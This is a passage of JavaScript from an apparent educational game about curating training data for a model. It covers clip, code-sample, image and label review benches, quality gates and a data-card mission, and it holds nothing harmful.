    const opts = [{ value: 'keep', label: 'Keep' }, { value: 'fix', label: 'Fix' }, { value: 'drop', label: 'Drop' }];
    const c = choiceList(CLIPS, (x) => ({ head: ['Clip', 'Format', 'Secs', 'Peak', 'Consent', 'WER', 'Decision'], cells: [x.id + ': ' + x.human.slice(0, 26) + '...', (x.sr / 1000) + ' kHz ' + (x.ch === 1 ? 'mono' : 'stereo'), x.dur, x.peak.toFixed(2), x.consent ? 'signed' : 'none', LAB.pct(wer(x.human, x.asr))] }), opts);
    const fb = h('div');
    const check = h('button', { class: 'ac-btn', type: 'button' }, 'Check clips');
    check.addEventListener('click', () => {
      fb.innerHTML = '';
      const errs = [];
      for (const x of CLIPS) {
        const want = x.bad ? 'drop' : x.fix ? 'fix' : 'keep';
        if (c.state[x.id] !== want) errs.push('Clip ' + x.id + ': ' + (x.bad || (x.fix === 'convert' ? 'Fixable: convert to 16 kHz mono.' : x.fix === 'cut' ? 'Fixable: too long, cut into 5 to 30 second segments with VAD.' : wer(x.human, x.asr) > 0 ? 'A 20 or 30 percent WER on a local place name is normal. Local names are exactly what you want to teach. Keep it.' : 'This clip is clean. Keep it.')));
      }
      if (errs.length) { misses += errs.length; AC.audio.bad(); fb.append(h('ul', { class: 'mini c-amber' }, errs.map((e) => h('li', {}, e)))); }
      else pass(misses);
    });
    pane.append(c.el, h('div', { class: 'ac-actions' }, check), fb);
  }
  function codeBench(pane, pass) {
    let ran = false, misses = 0;
    const results = {};
    const opts = [{ value: 'keep', label: 'Keep' }, { value: 'drop', label: 'Drop' }];
    const status = {};
    const head = ['Sample', 'Code', 'Test result', 'Decision'];
    const state = {};
    const rows = CODE_SAMPLES.map((x) => {
      const s = h('span', { class: 'mono dim' }, 'not run');
      status[x.title] = s;
      return { cells: [x.title, h('code', {}, x.code.slice(0, 74)), s, LAB.seg(opts, null, (v) => (state[x.title] = v))] };
    });
    const run = h('button', { class: 'ac-btn ghost', type: 'button' }, 'Execute all in the sandbox');
    run.addEventListener('click', () => {
      // shipped samples only; run in a throwaway worker with a timeout, as a real sandbox would
      for (const x of CODE_SAMPLES) {
        const src = 'onmessage=()=>{try{' + x.code + ';postMessage(!!(' + x.test + '))}catch(e){postMessage(false)}}';
        const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })));
        const kill = setTimeout(() => { w.terminate(); status[x.title].textContent = 'timeout'; }, 1500);
        w.onmessage = (e) => { clearTimeout(kill); w.terminate(); results[x.title] = e.data; status[x.title].textContent = e.data ? 'PASS' : 'FAIL'; status[x.title].className = 'mono ' + (e.data ? 'c-green' : 'c-red'); };
        w.postMessage(1);
      }
      ran = true;
    });
    const fb = h('div');
    const check = h('button', { class: 'ac-btn', type: 'button' }, 'Check decisions');
    check.addEventListener('click', () => {
      fb.innerHTML = '';
      if (!ran) { AC.audio.bad(); return fb.append(h('p', { class: 'c-amber' }, 'Execute them first. Reading is not verifying.')); }
      const errs = [];
      for (const x of CODE_SAMPLES) if (state[x.title] !== (x.keep ? 'keep' : 'drop')) errs.push(x.title + ': ' + (x.why || 'It passes, and nothing is wrong with it. Keep it.'));
      if (errs.length) { misses += errs.length; AC.audio.bad(); fb.append(h('ul', { class: 'mini c-amber' }, errs.map((e) => h('li', {}, e)))); }
      else pass(misses);
    });
    pane.append(h('p', {}, 'Execute, do not just read. Then keep only samples that pass and are safe to teach.'), run, LAB.table(head, rows), h('div', { class: 'ac-actions' }, check), fb);
  }
  function visionBench(pane, pass) {
    let misses = 0;
    const canv = {};
    const grid = h('div', { class: 'imgs' });
    const state = {};
    IMAGES.forEach((im) => {
      const c = h('canvas', { width: 32, height: 32, 'aria-label': im.cap });
      const g = c.getContext('2d');
      g.fillStyle = '#111c2c'; g.fillRect(0, 0, 32, 32);
      im.draw(g);
      canv[im.id] = c;
      const seg = LAB.seg([{ value: 'keep', label: 'Keep' }, { value: 'drop', label: 'Drop' }], null, (v) => (state[im.id] = v));
      const dup = h('small', { class: 'mono dim' });
      im.dupEl = dup;
      grid.appendChild(h('div', { class: 'imgc' }, c, h('span', {}, '"' + im.cap + '"'), dup, seg));
    });
    const hashBtn = h('button', { class: 'ac-btn ghost', type: 'button' }, 'Run perceptual hash');
    hashBtn.addEventListener('click', () => {
      const hs = IMAGES.map((im) => ({ im, hash: ahash(canv[im.id]) }));
      for (let i = 0; i < hs.length; i++) {
        let best = null, bd = 99;
        for (let j = 0; j < i; j++) { const d = hamming(hs[i].hash, hs[j].hash); if (d < bd) { bd = d; best = hs[j].im; } }
        hs[i].im.dupEl.textContent = best && bd <= 12 ? 'duplicate of #' + best.id + ' (distance ' + bd + ')' : 'unique';
        hs[i].im.dupEl.className = 'mono ' + (best && bd <= 12 ? 'c-amber' : 'dim');
      }
    });
    const fb = h('div');
    const check = h('button', { class: 'ac-btn', type: 'button' }, 'Check images');
    check.addEventListener('click', () => {
      fb.innerHTML = '';
      const errs = [];
      for (const im of IMAGES) {
        const want = im.ok ? 'keep' : 'drop';
        if (state[im.id] !== want) errs.push('Image ' + im.id + ': ' + (im.dupOf ? 'Perceptual duplicate of image ' + im.dupOf + '.' : im.badCaption ? 'The caption must describe what is visible.' : im.blank ? 'A blank image with a made-up caption teaches hallucination.' : im.watermark ? 'Watermarked stock content must go.' : 'This one is fine. Keep it.'));
      }
      if (errs.length) { misses += errs.length; AC.audio.bad(); fb.append(h('ul', { class: 'mini c-amber' }, errs.map((e) => h('li', {}, e)))); }
      else pass(misses);
    });
    pane.append(h('p', {}, 'Drop duplicates, wrong captions, corrupt images and watermarks.'), hashBtn, grid, h('div', { class: 'ac-actions' }, check), fb);
  }
  function emotionBench(pane, pass) {
    const rows = LABEL_LINES.map((r) => r.slice());
    const k = h('b', { class: 'mono' });
    const body = h('div');
    const refresh = () => { const v = kappa(rows); k.textContent = v.toFixed(2); k.className = 'mono ' + (v >= 0.8 ? 'c-green' : 'c-amber'); return v; };
    const draw = () => {
      body.innerHTML = '';
      const dis = rows.map((r, i) => ({ r, i })).filter((x) => x.r[1] !== x.r[2]);
      body.append(LAB.table(['Line', 'Labeller A', 'Labeller B', 'Decide'], dis.map(({ r }) => [r[0], r[1], r[2], LAB.seg([{ value: 'A', label: r[1] }, { value: 'B', label: r[2] }], null, (v) => { const pick = v === 'A' ? r[1] : r[2]; r[1] = pick; r[2] = pick; refresh(); AC.audio.ping(); setTimeout(draw, 150); })])));
      if (!dis.length) body.append(h('p', { class: 'c-green' }, 'No disagreements left.'));
    };
    const check = h('button', { class: 'ac-btn', type: 'button' }, 'Check agreement');
    check.addEventListener('click', () => { if (refresh() >= 0.8) pass(0); else { AC.audio.bad(); AC.ui.toast('Kappa needs 0.80', 'var(--amber)'); } });
    pane.append(h('p', {}, 'Two people labelled ' + rows.length + ' lines with the closed emotion list. Agree on the rule for each disagreement until Cohen\'s kappa reaches 0.80.'), h('p', {}, 'Cohen\'s kappa: ', k), body, h('div', { class: 'ac-actions' }, check));
    refresh(); draw();
  }

  // ------------------------------------------------- Mission 4: quality gates and data card
  const gatesM = {
    id: 'gates', title: 'Pass the quality gates',
    objective: 'Review real rows by hand, then sign the data card',
    story: 'The numbers look good, but the guide insists: read the data yourself. Mistakes hide from filters. Then write the data card that ships with your model.',
    learn: [
      { t: 'Manual review', p: 'Read at least 200 random rows per source and capability, and judge 95 percent or more acceptable. Here you read a real random sample.', f: 'Gate: 95% acceptable' },
      { t: 'Data card', p: 'Sources, licences, filters, known gaps, date and version.', f: 'Versioned, so you can reproduce it' },
    ],
    proved: 'You read your own data, the step most teams skip. Your dataset is versioned and has a data card, so your model can be reproduced. That is Part 4.6.',
    tip: 'Reject only rows that are really wrong. If over 5 percent fail, the line needs another run.',
    get quiz() { return AC.QUESTIONS.find((q) => q.id === 'gates'); },
    async start(api) {
      LAB.closeBench();
      const ds = await LAB.get('dataset');
      if (!ds) return requireMsg('Lock a dataset on the 12-stage line first.', 'refinery.html#line');
      const prov = await LAB.get('provenance');
      const st = api.state;
      const all = ds.splits.train.concat(ds.splits.val);
      const rng = ML.rng(Date.now() % 100000);
      const bySrc = {};
      for (const r of all) (bySrc[r.s] = bySrc[r.s] || []).push(r);
      st.sample = [];
      for (const s in bySrc) { const list = bySrc[s]; for (let n = 0; n < 3 && list.length; n++) st.sample.push(list[Math.floor(rng() * list.length)]); }
      st.sample = st.sample.slice(0, 30);
      st.bad = [];
      const b = LAB.bench('Manual review', 'A real random sample from your dataset. In production this is 200 rows per source.');
      const area = h('div');
      b.add(LAB.tag('real'), area);
      let i = 0;
      const showRow = () => {
        if (i >= st.sample.length) return card();
        const r = st.sample[i];
        api.progress((i / st.sample.length) * 0.7);
        const u = r.messages[0].content;
        const am = r.messages.find((m) => m.role === 'assistant');
        const reply = am.tool_call ? JSON.stringify(am.tool_call) : am.content;
        area.innerHTML = '';
        area.append(h('h3', {}, 'Row ' + (i + 1) + ' of ' + st.sample.length + ' · source: ' + r.s), h('div', { class: 'review' }, h('p', {}, h('b', {}, 'User: '), u), h('p', {}, h('b', {}, 'Assistant: '), reply), h('p', { class: 'mono dim' }, JSON.stringify(am.events))),
          h('div', { class: 'ac-actions' }, h('button', { class: 'ac-btn ghost', type: 'button', onclick: () => { st.bad.push(r.i); i++; showRow(); } }, 'Not acceptable'), h('button', { class: 'ac-btn', type: 'button', onclick: () => { i++; showRow(); } }, 'Acceptable')));
      };
      const card = () => {
        const rate = 1 - st.bad.length / st.sample.length;
        area.innerHTML = '';
        const g = ds.gates;
        const srcs = prov.sources.filter((s) => s.decision === 'admit');
        const gapsI = h('textarea', { rows: 3, 'aria-label': 'Known gaps', placeholder: 'Example: little Luganda, few long conversations, no medical knowledge.' });
        area.append(
          h('h3', {}, 'Gates'),
          LAB.table(['Gate', 'Result'], [
            { cls: rate >= 0.95 ? 'ok' : 'no', cells: ['Manual review', LAB.pct(rate) + ' acceptable of ' + st.sample.length + ' rows'] },
            { cls: 'ok', cells: ['Dedupe report', g.exact + ' exact, ' + LAB.pct(g.nearRate, 1) + ' near'] },
            { cls: 'ok', cells: ['Distribution', 'Largest source: ' + g.topSrc + ' at ' + LAB.pct(g.topShare)] },
            { cls: 'ok', cells: ['Format check', LAB.pct(g.formatRate) + ' parse in the template'] },
            { cls: 'ok', cells: ['Safety and PII', g.pii + ' secrets found'] },
          ]),
          h('h3', {}, 'Data card'),
          LAB.table(['Field', 'Value'], [['Version', ds.versionHash], ['Rows', AC.fmt(g.n)], ['Sources', srcs.map((s) => s.name).join('; ').slice(0, 220)], ['Licences', [...new Set(srcs.map((s) => s.licence))].join('; ')], ['Share-alike duties', srcs.filter((s) => s.shareAlike).map((s) => s.name).join('; ') || 'None'], ['Filters', ds.report.map((r) => r.name + ' -' + r.removed).join(', ')]]),
          LAB.field('Known gaps (write at least one honest sentence)', gapsI)
        );
        const sign = h('button', { class: 'ac-btn', type: 'button' }, 'Sign the data card');
        sign.addEventListener('click', async () => {
          if (rate < 0.95) return AC.ui.card({ eyebrow: 'Gate failed', title: 'Under 95 percent', body: ['You judged too many rows unacceptable. Rows from these sources need a tighter filter. Go back to the line, then review again.'], buttons: [{ label: 'Back to the line', onclick: () => { location.hash = '#line'; location.reload(); } }, { label: 'Review again', ghost: true, onclick: () => api.restart() }] });
          if (gapsI.value.trim().length < 12) return AC.ui.toast('Write the known gaps', 'var(--amber)');
          const removeSet = new Set(st.bad);
          ds.splits.train = ds.splits.train.filter((r) => !removeSet.has(r.i));
          ds.splits.val = ds.splits.val.filter((r) => !removeSet.has(r.i));
          ds.reviewed = true;
          ds.card = { gaps: gapsI.value.trim(), reviewRate: rate, reviewed: st.sample.length, signedAt: Date.now() };
          await LAB.set('dataset', ds);
          const exportRows = ds.splits.train.length;
          api.win(gapsI.value.trim().length > 40 ? 3 : 2, 'Dataset ' + ds.versionHash + ' signed: ' + AC.fmt(exportRows) + ' training rows ready for the GPU.');
        });
        area.append(h('div', { class: 'ac-actions' }, sign));
        api.progress(0.9);
      };
      showRow();
    },
  };

  const MR = AC.missions({ game: 'refinery', week: 3, list: [provenance, line, benchM, gatesM], onSelect: () => { LAB.closeBench(); } });
  S.start();
  MR.begin();
  window.__MR = MR;
})();
